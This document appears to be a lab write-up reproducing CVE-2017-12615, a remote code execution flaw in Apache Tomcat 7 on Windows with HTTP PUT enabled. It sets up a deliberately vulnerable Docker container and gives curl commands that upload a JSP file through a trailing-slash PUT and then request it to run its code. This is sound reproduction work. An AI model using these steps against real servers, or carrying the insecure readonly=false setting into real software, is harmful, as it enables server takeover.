# CVE-2017-12615

## Description

When running Apache Tomcat 7.0.0 to 7.0.79 on Windows with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.

## Setup

1. Build and run the docker container, the files are present in [vulntomcat](../vulntomcat/).

    ```bash
    docker build . -t vulntomcat
    docker run -p 8080:8080 --name vulntomcatcontainer vulntomcat
    ```

    The important thing is to set the readonly parameter to false in the `web.xml` file.

    ```xml
    <init-param>
        <param-name>readonly</param-name>
         <param-value>false</param-value>
    </init-param>
    ```

## Exploit

1. First we try PUTing a JSP file to the server.

    ```bash
    curl -v -X PUT http://localhost:8080/payload.jsp --data-binary @payload.jsp
    ```

    This returns a 404 error, however if we add a trailing slash to the URL, the file is uploaded successfully.

    ```bash
    curl -v -X PUT http://localhost:8080/payload.jsp/ --data-binary @payload.jsp
    ```

2. Now we can access the file by visiting `http://localhost:8080/payload.jsp`.

    ```bash
    curl http://localhost:8080/payload.jsp
    ```

    This will execute the code in the JSP file.
